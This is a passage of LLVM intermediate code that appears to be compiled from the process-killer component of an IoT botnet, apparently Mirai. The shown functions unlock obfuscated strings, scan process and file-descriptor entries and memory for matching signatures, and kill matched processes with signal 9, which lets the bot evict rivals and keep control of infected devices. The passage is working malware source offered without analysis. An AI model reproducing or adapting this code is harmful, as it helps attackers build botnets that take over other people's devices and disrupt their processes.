  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 1
  store i8 48, i8* %46, align 1
  br label %47

47:                                               ; preds = %37, %1
  call void @table_unlock_val(i8 zeroext 13)
  call void @table_unlock_val(i8 zeroext 14)
  call void @table_unlock_val(i8 zeroext 15)
  call void @table_unlock_val(i8 zeroext 17)
  %48 = call i8* @table_retrieve_val(i32 17, i32* null)
  %49 = call i32 (i8*, i32, ...) @open(i8* %48, i32 0)
  store i32 %49, i32* %12, align 4
  %50 = load i32, i32* %12, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  store i8 0, i8* %2, align 1
  br label %375

53:                                               ; preds = %47
  br label %54

54:                                               ; preds = %222, %215, %184, %86, %53
  %55 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 0
  %56 = load i32, i32* %12, align 4
  %57 = call i8* @util_fdgets(i8* %55, i32 512, i32 %56)
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %223

59:                                               ; preds = %54
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %60

60:                                               ; preds = %76, %59
  %61 = load i32, i32* %17, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %67, label %74

67:                                               ; preds = %60
  %68 = load i32, i32* %17, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp ne i32 %72, 58
  br label %74

74:                                               ; preds = %67, %60
  %75 = phi i1 [ false, %60 ], [ %73, %67 ]
  br i1 %75, label %76, label %79

76:                                               ; preds = %74
  %77 = load i32, i32* %17, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %17, align 4
  br label %60, !llvm.loop !8

79:                                               ; preds = %74
  %80 = load i32, i32* %17, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %81
  %83 = load i8, i8* %82, align 1
  %84 = sext i8 %83 to i32
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %87

86:                                               ; preds = %79
  br label %54, !llvm.loop !9

87:                                               ; preds = %79
  %88 = load i32, i32* %17, align 4
  %89 = add nsw i32 %88, 2
  store i32 %89, i32* %17, align 4
  %90 = load i32, i32* %17, align 4
  store i32 %90, i32* %18, align 4
  br label %91

91:                                               ; preds = %107, %87
  %92 = load i32, i32* %17, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %105

98:                                               ; preds = %91
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = icmp ne i32 %103, 32
  br label %105

105:                                              ; preds = %98, %91
  %106 = phi i1 [ false, %91 ], [ %104, %98 ]
  br i1 %106, label %107, label %110

107:                                              ; preds = %105
  %108 = load i32, i32* %17, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %17, align 4
  br label %91, !llvm.loop !10

110:                                              ; preds = %105
  %111 = load i32, i32* %17, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %17, align 4
  %113 = sext i32 %111 to i64
  %114 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %113
  store i8 0, i8* %114, align 1
  %115 = load i32, i32* %18, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %116
  %118 = load i32, i32* %18, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %119
  %121 = call i32 @util_strlen(i8* %120)
  %122 = getelementptr inbounds [16 x i8], [16 x i8]* %16, i64 0, i64 0
  %123 = call i32 @util_stristr(i8* %117, i32 %121, i8* %122)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %125, label %222

125:                                              ; preds = %110
  store i32 0, i32* %19, align 4
  store i8 0, i8* %20, align 1
  store i8 0, i8* %21, align 1
  br label %126

126:                                              ; preds = %178, %125
  %127 = load i32, i32* %19, align 4
  %128 = icmp slt i32 %127, 7
  br i1 %128, label %129, label %137

129:                                              ; preds = %126
  %130 = load i32, i32* %17, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %17, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %132
  %134 = load i8, i8* %133, align 1
  %135 = sext i8 %134 to i32
  %136 = icmp ne i32 %135, 0
  br label %137

137:                                              ; preds = %129, %126
  %138 = phi i1 [ false, %126 ], [ %136, %129 ]
  br i1 %138, label %139, label %179

139:                                              ; preds = %137
  %140 = load i32, i32* %17, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %141
  %143 = load i8, i8* %142, align 1
  %144 = sext i8 %143 to i32
  %145 = icmp eq i32 %144, 32
  br i1 %145, label %153, label %146

146:                                              ; preds = %139
  %147 = load i32, i32* %17, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = icmp eq i32 %151, 9
  br i1 %152, label %153, label %154

153:                                              ; preds = %146, %139
  store i8 1, i8* %20, align 1
  br label %178

154:                                              ; preds = %146
  %155 = load i8, i8* %20, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 1
  br i1 %157, label %158, label %161

158:                                              ; preds = %154
  %159 = load i32, i32* %19, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %19, align 4
  br label %161

161:                                              ; preds = %158, %154
  %162 = load i8, i8* %20, align 1
  %163 = sext i8 %162 to i32
  %164 = icmp eq i32 %163, 1
  br i1 %164, label %165, label %177

165:                                              ; preds = %161
  %166 = load i32, i32* %19, align 4
  %167 = icmp eq i32 %166, 1
  br i1 %167, label %168, label %177

168:                                              ; preds = %165
  %169 = load i32, i32* %17, align 4
  %170 = add nsw i32 %169, 1
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %171
  %173 = load i8, i8* %172, align 1
  %174 = sext i8 %173 to i32
  %175 = icmp eq i32 %174, 65
  br i1 %175, label %176, label %177

176:                                              ; preds = %168
  store i8 1, i8* %21, align 1
  br label %177

177:                                              ; preds = %176, %168, %165, %161
  store i8 0, i8* %20, align 1
  br label %178

178:                                              ; preds = %177, %153
  br label %126, !llvm.loop !11

179:                                              ; preds = %137
  %180 = load i32, i32* %17, align 4
  store i32 %180, i32* %18, align 4
  %181 = load i8, i8* %21, align 1
  %182 = sext i8 %181 to i32
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %185

184:                                              ; preds = %179
  br label %54, !llvm.loop !9

185:                                              ; preds = %179
  br label %186

186:                                              ; preds = %202, %185
  %187 = load i32, i32* %17, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %188
  %190 = load i8, i8* %189, align 1
  %191 = sext i8 %190 to i32
  %192 = icmp ne i32 %191, 0
  br i1 %192, label %193, label %200

193:                                              ; preds = %186
  %194 = load i32, i32* %17, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %195
  %197 = load i8, i8* %196, align 1
  %198 = sext i8 %197 to i32
  %199 = icmp ne i32 %198, 32
  br label %200

200:                                              ; preds = %193, %186
  %201 = phi i1 [ false, %186 ], [ %199, %193 ]
  br i1 %201, label %202, label %205

202:                                              ; preds = %200
  %203 = load i32, i32* %17, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %17, align 4
  br label %186, !llvm.loop !12

205:                                              ; preds = %200
  %206 = load i32, i32* %17, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %17, align 4
  %208 = sext i32 %206 to i64
  %209 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = load i32, i32* %18, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %211
  %213 = call i32 @util_strlen(i8* %212)
  %214 = icmp sgt i32 %213, 15
  br i1 %214, label %215, label %216

215:                                              ; preds = %205
  br label %54, !llvm.loop !9

216:                                              ; preds = %205
  %217 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %218 = load i32, i32* %18, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %219
  %221 = call i32 @util_strcpy(i8* %217, i8* %220)
  br label %223

222:                                              ; preds = %110
  br label %54, !llvm.loop !9

223:                                              ; preds = %216, %54
  %224 = load i32, i32* %12, align 4
  %225 = call i32 @close(i32 %224)
  %226 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %227 = call i32 @util_strlen(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %230

229:                                              ; preds = %223
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  call void @table_lock_val(i8 zeroext 15)
  call void @table_lock_val(i8 zeroext 17)
  store i8 0, i8* %2, align 1
  br label %375

230:                                              ; preds = %223
  %231 = call i8* @table_retrieve_val(i32 13, i32* null)
  %232 = call %struct.__dirstream* @opendir(i8* %231)
  store %struct.__dirstream* %232, %struct.__dirstream** %4, align 8
  %233 = icmp ne %struct.__dirstream* %232, null
  br i1 %233, label %234, label %371

234:                                              ; preds = %230
  br label %235

235:                                              ; preds = %367, %280, %257, %234
  %236 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %237 = call %struct.dirent* @readdir(%struct.__dirstream* %236)
  store %struct.dirent* %237, %struct.dirent** %6, align 8
  %238 = icmp ne %struct.dirent* %237, null
  br i1 %238, label %239, label %242

239:                                              ; preds = %235
  %240 = load i32, i32* %15, align 4
  %241 = icmp eq i32 %240, 0
  br label %242

242:                                              ; preds = %239, %235
  %243 = phi i1 [ false, %235 ], [ %241, %239 ]
  br i1 %243, label %244, label %368

244:                                              ; preds = %242
  %245 = load %struct.dirent*, %struct.dirent** %6, align 8
  %246 = getelementptr inbounds %struct.dirent, %struct.dirent* %245, i32 0, i32 4
  %247 = getelementptr inbounds [256 x i8], [256 x i8]* %246, i64 0, i64 0
  store i8* %247, i8** %22, align 8
  %248 = load i8*, i8** %22, align 8
  %249 = load i8, i8* %248, align 1
  %250 = sext i8 %249 to i32
  %251 = icmp slt i32 %250, 48
  br i1 %251, label %257, label %252

252:                                              ; preds = %244
  %253 = load i8*, i8** %22, align 8
  %254 = load i8, i8* %253, align 1
  %255 = sext i8 %254 to i32
  %256 = icmp sgt i32 %255, 57
  br i1 %256, label %257, label %258

257:                                              ; preds = %252, %244
  br label %235, !llvm.loop !13

258:                                              ; preds = %252
  %259 = load i8*, i8** %14, align 8
  %260 = call i8* @table_retrieve_val(i32 13, i32* null)
  %261 = call i32 @util_strcpy(i8* %259, i8* %260)
  %262 = load i8*, i8** %14, align 8
  %263 = load i8*, i8** %14, align 8
  %264 = call i32 @util_strlen(i8* %263)
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i8, i8* %262, i64 %265
  %267 = load i8*, i8** %22, align 8
  %268 = call i32 @util_strcpy(i8* %266, i8* %267)
  %269 = load i8*, i8** %14, align 8
  %270 = load i8*, i8** %14, align 8
  %271 = call i32 @util_strlen(i8* %270)
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds i8, i8* %269, i64 %272
  %274 = call i8* @table_retrieve_val(i32 14, i32* null)
  %275 = call i32 @util_strcpy(i8* %273, i8* %274)
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %277 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %278 = call i64 @readlink(i8* %276, i8* %277, i64 4096) #6
  %279 = icmp eq i64 %278, -1
  br i1 %279, label %280, label %281

280:                                              ; preds = %258
  br label %235, !llvm.loop !13

281:                                              ; preds = %258
  %282 = load i8*, i8** %14, align 8
  %283 = call i8* @table_retrieve_val(i32 13, i32* null)
  %284 = call i32 @util_strcpy(i8* %282, i8* %283)
  %285 = load i8*, i8** %14, align 8
  %286 = load i8*, i8** %14, align 8
  %287 = call i32 @util_strlen(i8* %286)
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds i8, i8* %285, i64 %288
  %290 = load i8*, i8** %22, align 8
  %291 = call i32 @util_strcpy(i8* %289, i8* %290)
  %292 = load i8*, i8** %14, align 8
  %293 = load i8*, i8** %14, align 8
  %294 = call i32 @util_strlen(i8* %293)
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds i8, i8* %292, i64 %295
  %297 = call i8* @table_retrieve_val(i32 15, i32* null)
  %298 = call i32 @util_strcpy(i8* %296, i8* %297)
  %299 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %300 = call %struct.__dirstream* @opendir(i8* %299)
  store %struct.__dirstream* %300, %struct.__dirstream** %5, align 8
  %301 = icmp ne %struct.__dirstream* %300, null
  br i1 %301, label %302, label %367

302:                                              ; preds = %281
  br label %303

303:                                              ; preds = %363, %351, %302
  %304 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %305 = call %struct.dirent* @readdir(%struct.__dirstream* %304)
  store %struct.dirent* %305, %struct.dirent** %7, align 8
  %306 = icmp ne %struct.dirent* %305, null
  br i1 %306, label %307, label %310

307:                                              ; preds = %303
  %308 = load i32, i32* %15, align 4
  %309 = icmp eq i32 %308, 0
  br label %310

310:                                              ; preds = %307, %303
  %311 = phi i1 [ false, %303 ], [ %309, %307 ]
  br i1 %311, label %312, label %364

312:                                              ; preds = %310
  %313 = load %struct.dirent*, %struct.dirent** %7, align 8
  %314 = getelementptr inbounds %struct.dirent, %struct.dirent* %313, i32 0, i32 4
  %315 = getelementptr inbounds [256 x i8], [256 x i8]* %314, i64 0, i64 0
  store i8* %315, i8** %23, align 8
  %316 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @util_zero(i8* %316, i32 4096)
  %317 = load i8*, i8** %14, align 8
  %318 = call i8* @table_retrieve_val(i32 13, i32* null)
  %319 = call i32 @util_strcpy(i8* %317, i8* %318)
  %320 = load i8*, i8** %14, align 8
  %321 = load i8*, i8** %14, align 8
  %322 = call i32 @util_strlen(i8* %321)
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8, i8* %320, i64 %323
  %325 = load i8*, i8** %22, align 8
  %326 = call i32 @util_strcpy(i8* %324, i8* %325)
  %327 = load i8*, i8** %14, align 8
  %328 = load i8*, i8** %14, align 8
  %329 = call i32 @util_strlen(i8* %328)
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8, i8* %327, i64 %330
  %332 = call i8* @table_retrieve_val(i32 15, i32* null)
  %333 = call i32 @util_strcpy(i8* %331, i8* %332)
  %334 = load i8*, i8** %14, align 8
  %335 = load i8*, i8** %14, align 8
  %336 = call i32 @util_strlen(i8* %335)
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8, i8* %334, i64 %337
  %339 = call i32 @util_strcpy(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %340 = load i8*, i8** %14, align 8
  %341 = load i8*, i8** %14, align 8
  %342 = call i32 @util_strlen(i8* %341)
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %340, i64 %343
  %345 = load i8*, i8** %23, align 8
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %348 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %349 = call i64 @readlink(i8* %347, i8* %348, i64 4096) #6
  %350 = icmp eq i64 %349, -1
  br i1 %350, label %351, label %352

351:                                              ; preds = %312
  br label %303, !llvm.loop !14

352:                                              ; preds = %312
  %353 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %354 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %355 = call i32 @util_strlen(i8* %354)
  %356 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %357 = call i32 @util_stristr(i8* %353, i32 %355, i8* %356)
  %358 = icmp ne i32 %357, -1
  br i1 %358, label %359, label %363

359:                                              ; preds = %352
  %360 = load i8*, i8** %22, align 8
  %361 = call i32 @util_atoi(i8* %360, i32 10)
  %362 = call i32 @kill(i32 %361, i32 9) #6
  store i32 1, i32* %15, align 4
  br label %363

363:                                              ; preds = %359, %352
  br label %303, !llvm.loop !14

364:                                              ; preds = %310
  %365 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %366 = call i32 @closedir(%struct.__dirstream* %365)
  br label %367

367:                                              ; preds = %364, %281
  br label %235, !llvm.loop !13

368:                                              ; preds = %242
  %369 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %370 = call i32 @closedir(%struct.__dirstream* %369)
  br label %371

371:                                              ; preds = %368, %230
  %372 = call i32 @sleep(i32 1)
  call void @table_lock_val(i8 zeroext 13)
  call void @table_lock_val(i8 zeroext 14)
  call void @table_lock_val(i8 zeroext 15)
  %373 = load i32, i32* %15, align 4
  %374 = trunc i32 %373 to i8
  store i8 %374, i8* %2, align 1
  br label %375

375:                                              ; preds = %371, %229, %52
  %376 = load i8, i8* %2, align 1
  ret i8 %376
}

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

declare %struct.dirent* @readdir(%struct.__dirstream*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #4

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i64 @readlink(i8*, i8*, i64) #1

declare i32 @util_stristr(i8*, i32, i8*) #2

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind
declare i32 @getpid() #1

; Function Attrs: nounwind
declare i32 @getppid() #1

declare signext i8 @util_strcmp(i8*, i8*) #2

declare i32 @open(i8*, i32, ...) #2

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @memory_scan_match(i8* %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca [4096 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i8 0, i8* %11, align 1
  %12 = load i8*, i8** %3, align 8
  %13 = call i32 (i8*, i32, ...) @open(i8* %12, i32 0)
  store i32 %13, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i8 0, i8* %2, align 1
  br label %47

16:                                               ; preds = %1
  call void @table_unlock_val(i8 zeroext 18)
  call void @table_unlock_val(i8 zeroext 19)
  %17 = call i8* @table_retrieve_val(i32 18, i32* %9)
  store i8* %17, i8** %7, align 8
  %18 = call i8* @table_retrieve_val(i32 19, i32* %10)
  store i8* %18, i8** %8, align 8
  br label %19

19:                                               ; preds = %42, %16
  %20 = load i32, i32* %4, align 4
  %21 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %22 = call i64 @read(i32 %20, i8* %21, i64 4096)
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %5, align 4
  %24 = icmp sgt i32 %23, 0
  br i1 %24, label %25, label %43

25:                                               ; preds = %19
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %27 = load i32, i32* %5, align 4
  %28 = load i8*, i8** %7, align 8
  %29 = load i32, i32* %9, align 4
  %30 = call signext i8 @mem_exists(i8* %26, i32 %27, i8* %28, i32 %29)
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %41, label %33

33:                                               ; preds = %25
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %35 = load i32, i32* %5, align 4
  %36 = load i8*, i8** %8, align 8
  %37 = load i32, i32* %10, align 4
  %38 = call signext i8 @mem_exists(i8* %34, i32 %35, i8* %36, i32 %37)
  %39 = sext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

41:                                               ; preds = %33, %25
  store i8 1, i8* %11, align 1
  br label %43

42:                                               ; preds = %33
  br label %19, !llvm.loop !15

43:                                               ; preds = %41, %19
  call void @table_lock_val(i8 zeroext 18)
  call void @table_lock_val(i8 zeroext 19)
  %44 = load i32, i32* %4, align 4
  %45 = call i32 @close(i32 %44)
  %46 = load i8, i8* %11, align 1
  store i8 %46, i8* %2, align 1
  br label %47

47:                                               ; preds = %43, %15
  %48 = load i8, i8* %2, align 1
  ret i8 %48
}

declare void @util_zero(i8*, i32) #2

declare i32 @closedir(%struct.__dirstream*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killer_kill() #0 {
  %1 = load i32, i32* @killer_pid, align 4
  %2 = call i32 @kill(i32 %1, i32 9) #6
  ret void
}

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare i8* @util_itoa(i32, i32, i8*) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #3

declare i32 @util_strlen(i8*) #2

declare i8* @util_fdgets(i8*, i32, i32) #2

declare i32 @util_atoi(i8*, i32) #2

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal signext i8 @mem_exists(i8* %0, i32 %1, i8* %2, i32 %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = load i32, i32* %9, align 4
  %12 = load i32, i32* %7, align 4
  %13 = icmp sgt i32 %11, %12
  br i1 %13, label %14, label %15

14:                                               ; preds = %4
  store i8 0, i8* %5, align 1
  br label %42

15:                                               ; preds = %4
  br label %16

16:                                               ; preds = %40, %15
  %17 = load i32, i32* %7, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %7, align 4
  %19 = icmp ne i32 %17, 0
  br i1 %19, label %20, label %41

20:                                               ; preds = %16
  %21 = load i8*, i8** %6, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %6, align 8
  %23 = load i8, i8* %21, align 1
  %24 = sext i8 %23 to i32
  %25 = load i8*, i8** %8, align 8
  %26 = load i32, i32* %10, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp eq i32 %24, %30
  br i1 %31, label %32, label %39

32:                                               ; preds = %20
  %33 = load i32, i32* %10, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %10, align 4
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %34, %35
  br i1 %36, label %37, label %38

37:                                               ; preds = %32
  store i8 1, i8* %5, align 1
  br label %42

38:                                               ; preds = %32
  br label %40

39:                                               ; preds = %20
  store i32 0, i32* %10, align 4
  br label %40

40:                                               ; preds = %39, %38
  br label %16, !llvm.loop !16

41:                                               ; preds = %16
  store i8 0, i8* %5, align 1
  br label %42

42:                                               ; preds = %41, %37, %14
  %43 = load i8, i8* %5, align 1
  ret i8 %43
}

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone willreturn }
attributes #8 = { nounwind readonly willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
